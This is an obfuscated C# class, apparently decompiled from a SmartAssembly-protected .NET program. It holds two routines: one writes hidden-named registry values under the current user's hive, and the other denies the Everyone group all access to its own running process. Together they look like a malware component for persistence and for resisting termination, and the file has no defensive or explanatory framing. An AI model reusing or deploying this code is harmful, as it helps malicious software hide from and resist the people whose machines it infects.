using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace JNgWsfAJdq;

internal sealed class HBvwSokZxJP
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr MYYdoRLYbsOQH, int FISCuljaMYP, [Out] byte[] SDPQEiOHZnp, uint CnQaBfkuIET, out uint WaSaEfIGZFSYXSLh);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr tOhygAZbPlfN, int KFHEmzHZjKUJvo, [In] byte[] SxVNIDxlNhSM);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void tatiqUteRfqu(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107364736)));
			registryKey.SetValue(vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107364631)), getString_0(107366785));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor WfbTNjPoJcc(IntPtr intptr_0)
	{
		byte[] sDPQEiOHZnp = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, sDPQEiOHZnp, 0u, out var WaSaEfIGZFSYXSLh);
		if ((long)WaSaEfIGZFSYXSLh > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, sDPQEiOHZnp = new byte[WaSaEfIGZFSYXSLh], WaSaEfIGZFSYXSLh, out WaSaEfIGZFSYXSLh))
		{
			return null;
		}
		return new RawSecurityDescriptor(sDPQEiOHZnp, 0);
	}

	private void ldJAgMAIVeZfV(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void QSCgfqOMcpBE()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = WfbTNjPoJcc(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			ldJAgMAIVeZfV(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static HBvwSokZxJP()
	{
		Strings.CreateGetStringDelegate(typeof(HBvwSokZxJP));
	}
}
